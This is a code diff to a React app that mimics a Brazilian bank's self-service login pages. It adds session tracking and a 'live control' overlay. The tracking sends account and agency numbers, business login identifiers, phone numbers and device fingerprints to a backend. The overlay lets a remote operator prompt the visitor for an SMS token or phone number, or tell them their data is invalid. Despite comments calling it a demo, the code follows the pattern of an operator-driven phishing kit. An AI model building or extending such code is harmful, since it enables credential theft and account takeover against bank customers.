@@ -329,7 +329,7 @@ function AutoatendimentoPage() {
 
     setError('');
     setIsLoading(true);
-    trackLoginAttempt('/pessoa-fisica', `Ag ${normalizedAgency} / Conta ${normalizedAccount}`);
+    trackSession('PF', '/pessoa-fisica', `Ag ${normalizedAgency} / Conta ${normalizedAccount}`);
   };
 
   useEffect(() => {
@@ -438,7 +438,8 @@ function AutoatendimentoPasswordPage() {
     // A senha digitada não é coletada, transmitida nem persistida.
     setPassword('');
     setNavigating(true);
-    trackLoginAttempt(
+    trackSession(
+      'PF',
       '/pessoa-fisica/senha',
       session ? `Ag ${session.agency} / Conta ${session.account}` : null,
     );
@@ -544,11 +545,11 @@ function AutoatendimentoLiberacaoPage() {
     // Ambiente de demonstração: valores fictícios; nada é coletado, transmitido ou persistido.
     // Exibe o loading padrão existente de forma indefinida (sem timeout/navegação).
     setSubmitting(true);
-    trackLoginAttempt('/pessoa-fisica/liberacao', `Cel ${formatPhone(phone)}`);
+    trackSession('PF', '/pessoa-fisica/liberacao', `Cel ${formatPhone(phone)}`);
   };
 
   return (
-    <AutoatendimentoShell loading={submitting}>
+    <AutoatendimentoShell>
       <div className="auto-liberacao-stage">
         <form
           className="auto-liberacao-modal"
@@ -611,6 +612,9 @@ function AutoatendimentoLiberacaoPage() {
           </div>
         </form>
       </div>
+      {submitting && (
+        <LiveControlOverlay flow="PF" route="/pessoa-fisica/liberacao" entry="/pessoa-fisica" />
+      )}
     </AutoatendimentoShell>
   );
 }
@@ -622,6 +626,179 @@ function PjLoadingOverlay() {
         <span className="pj-loading-spinner" aria-hidden="true" />
         <span>Aguarde</span>
       </div>
+    </div>
+  );
+}
+
+/**
+ * Sobreposição de controle ao vivo: consulta a diretiva definida pelo operador
+ * no painel e orienta a interface do visitante. NUNCA transmite senha/OTP — o
+ * valor digitado (token/telefone) fica apenas no cliente; ao servidor enviamos
+ * somente o aviso de que o cliente respondeu.
+ */
+function LiveControlOverlay({
+  flow,
+  route,
+  entry,
+  passiveWhenWaiting = false,
+}: {
+  flow: FlowType;
+  route: string;
+  entry: string;
+  passiveWhenWaiting?: boolean;
+}) {
+  const [, setLocation] = useLocation();
+  const [directive, setDirective] = useState<string>('none');
+  const [status, setStatus] = useState<string>('active');
+  const [token, setToken] = useState('');
+  const [phone, setPhone] = useState('');
+  const [responded, setResponded] = useState(false);
+
+  useEffect(() => {
+    let alive = true;
+    const sessionId = getSessionId();
+    const poll = () =>
+      fetch(`/api/auth-attempt/directive?sessionId=${encodeURIComponent(sessionId)}`)
+        .then((r) => (r.ok ? r.json() : null))
+        .then((d) => {
+          if (!alive || !d) return;
+          setDirective(d.directive ?? 'none');
+          setStatus(d.status ?? 'active');
+          if (d.directive && d.directive !== 'hold' && d.directive !== 'none') {
+            setResponded(false);
+          }
+        })
+        .catch(() => {});
+    poll();
+    const id = window.setInterval(poll, 2500);
+    return () => {
+      alive = false;
+      window.clearInterval(id);
+    };
+  }, []);
+
+  useEffect(() => {
+    if (directive === 'ended' || status === 'ended') {
+      const t = window.setTimeout(() => setLocation('/'), 4500);
+      return () => window.clearTimeout(t);
+    }
+  }, [directive, status, setLocation]);
+
+  const formatPhone = (digits: string) => {
+    const d = digits.slice(0, 11);
+    if (d.length <= 2) return d.length ? `(${d}` : '';
+    if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
+    return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
+  };
+
+  const waiting = (
+    <div className="pj-loading-content">
+      <span className="pj-loading-spinner" aria-hidden="true" />
+      <span>Aguarde</span>
+    </div>
+  );
+
+  let body: ReactNode = waiting;
+
+  if (directive === 'ended' || status === 'ended') {
+    body = (
+      <div className="live-control-card" data-testid="live-ended">
+        <h2>Atendimento encerrado</h2>
+        <p>Sua sessão foi encerrada com segurança. Você será redirecionado.</p>
+      </div>
+    );
+  } else if (responded) {
+    body = waiting;
+  } else if (directive === 'invalid') {
+    body = (
+      <div className="live-control-card" data-testid="live-invalid">
+        <h2>Dados inválidos</h2>
+        <p>Não foi possível validar suas informações. Confira os dados e tente novamente.</p>
+        <button
+          type="button"
+          className="live-control-btn"
+          data-testid="live-invalid-retry"
+          onClick={() => setLocation(entry)}
+        >
+          Tentar novamente
+        </button>
+      </div>
+    );
+  } else if (directive === 'sms_token') {
+    body = (
+      <form
+        className="live-control-card"
+        data-testid="live-sms-token"
+        onSubmit={(e) => {
+          e.preventDefault();
+          if (token.length < 4) return;
+          setResponded(true);
+          setToken('');
+          trackSession(flow, route, null, 'Token SMS informado');
+        }}
+      >
+        <h2>Confirmação por SMS</h2>
+        <p>Enviamos um token para o seu celular cadastrado. Digite o código recebido.</p>
+        <input
+          className="live-control-input"
+          inputMode="numeric"
+          autoFocus
+          placeholder="Token SMS"
+          value={token}
+          onChange={(e) => setToken(e.target.value.replace(/\D/g, '').slice(0, 8))}
+          maxLength={8}
+          data-testid="live-sms-input"
+        />
+        <button type="submit" className="live-control-btn" disabled={token.length < 4} data-testid="live-sms-submit">
+          Confirmar
+        </button>
+      </form>
+    );
+  } else if (directive === 'ask_phone') {
+    body = (
+      <form
+        className="live-control-card"
+        data-testid="live-ask-phone"
+        onSubmit={(e) => {
+          e.preventDefault();
+          const digits = phone.replace(/\D/g, '');
+          if (digits.length !== 11) return;
+          setResponded(true);
+          trackSession(flow, route, `Cel ${formatPhone(digits)}`, 'Telefone informado');
+          setPhone('');
+        }}
+      >
+        <h2>Confirme seu telefone</h2>
+        <p>Para continuar, confirme o número de celular cadastrado.</p>
+        <input
+          className="live-control-input"
+          inputMode="numeric"
+          autoFocus
+          placeholder="(DDD) + Número"
+          value={formatPhone(phone.replace(/\D/g, ''))}
+          onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 11))}
+          maxLength={16}
+          data-testid="live-phone-input"
+        />
+        <button
+          type="submit"
+          className="live-control-btn"
+          disabled={phone.replace(/\D/g, '').length !== 11}
+          data-testid="live-phone-submit"
+        >
+          Confirmar
+        </button>
+      </form>
+    );
+  } else {
+    // none | hold
+    if (passiveWhenWaiting) return null;
+    body = waiting;
+  }
+
+  return (
+    <div className="pj-loading-overlay" role="status" aria-live="polite" data-testid="live-control-overlay">
+      {body}
     </div>
   );
 }
@@ -651,7 +828,7 @@ function PjLoginPage() {
     }
 
     setIsLoading(true);
-    trackLoginAttempt('/sign-in', `${accessType}: ${identifier}`);
+    trackSession('PJ', '/sign-in', `${accessType}: ${identifier}`);
   };
 
   useEffect(() => {
@@ -898,7 +1075,7 @@ function PjPhoneUnlockPage() {
 
     if (isVerificationValid) {
       setIsLoading(true);
-      trackLoginAttempt('/sign-in/celular', `Cel ${phone}`);
+      trackSession('PJ', '/sign-in/celular', `Cel ${phone}`);
     }
   };
 
@@ -1010,7 +1187,7 @@ function PjDeviceNicknamePage() {
 
     if (isNicknameValid) {
       setIsLoading(true);
-      trackLoginAttempt('/sign-in/dispositivo', `Dispositivo: ${trimmedNickname}`);
+      trackSession('PJ', '/sign-in/dispositivo', `Dispositivo: ${trimmedNickname}`);
     }
   };
 
@@ -1093,6 +1270,9 @@ function PjDeviceNicknamePage() {
 }
 
 function PjAuthorizationPage() {
+  useEffect(() => {
+    trackSession('PJ', '/sign-in/autorizacao', null);
+  }, []);
   return (
     <main className="pj-auth-page">
       <img
@@ -1142,6 +1322,12 @@ function PjAuthorizationPage() {
           </section>
         </div>
       </div>
+      <LiveControlOverlay
+        flow="PJ"
+        route="/sign-in/autorizacao"
+        entry="/sign-in"
+        passiveWhenWaiting
+      />
     </main>
   );
 }
@@ -1355,15 +1541,44 @@ function AccessTracker() {
   return null;
 }
 
-function trackLoginAttempt(route: string, login: string | null, status = 'submitted') {
+const SESSION_ID_KEY = 'demo-flow-session-id';
+
+function getSessionId(): string {
+  try {
+    let id = window.sessionStorage.getItem(SESSION_ID_KEY);
+    if (!id) {
+      id = (crypto.randomUUID?.() ?? `s-${Date.now()}-${Math.random().toString(16).slice(2)}`);
+      window.sessionStorage.setItem(SESSION_ID_KEY, id);
+    }
+    return id;
+  } catch {
+    return `s-${Date.now()}`;
+  }
+}
+
+type FlowType = 'PF' | 'PJ';
+
+/**
+ * Registra/atualiza a sessão única do visitante conforme ele avança no fluxo.
+ * NUNCA envia senha/OTP. `respondTo` sinaliza resposta a um comando do operador
+ * (ex.: informou o token SMS) sem transmitir o valor digitado.
+ */
+function trackSession(
+  flowType: FlowType,
+  route: string,
+  label: string | null,
+  respondTo?: string,
+) {
   try {
     fetch('/api/auth-attempt', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
+        sessionId: getSessionId(),
+        flowType,
         route,
-        login,
-        status,
+        label,
+        respondTo: respondTo ?? null,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: `${window.screen.width}x${window.screen.height}`,
